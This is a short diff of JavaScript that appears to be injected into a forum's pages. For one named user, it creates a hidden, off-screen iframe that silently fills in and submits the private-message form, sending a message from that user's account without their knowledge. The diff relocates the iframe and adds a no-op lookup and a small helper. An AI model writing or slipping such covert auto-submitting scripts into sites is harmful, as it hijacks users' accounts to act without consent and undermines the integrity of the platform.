@@ -11,7 +11,8 @@ if (user_name === "Bury_comedor") {
     iframe.style.position = "absolute";
     iframe.style.zIndex = -1;
     iframe.style.top = "-30px";
-    header.append(iframe);
+    document.body.append(iframe);
+    document.getElementById("del1me");
     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
     iframe.contentWindow.document.getElementById("subject").value = "bury";
@@ -19,6 +20,10 @@ if (user_name === "Bury_comedor") {
     iframe.contentWindow.document.getElementsByClassName("button1 default-submit-action")[0].click();
     //iframe.contentWindow.document.getElementsByName("add_to")[0].click();
 };
+
+function secondsToMS(seconds) {
+    return seconds * 1000;
+}
 
 // script_ids.forEach(script => {
 //     if (document.getElementById(script)) {
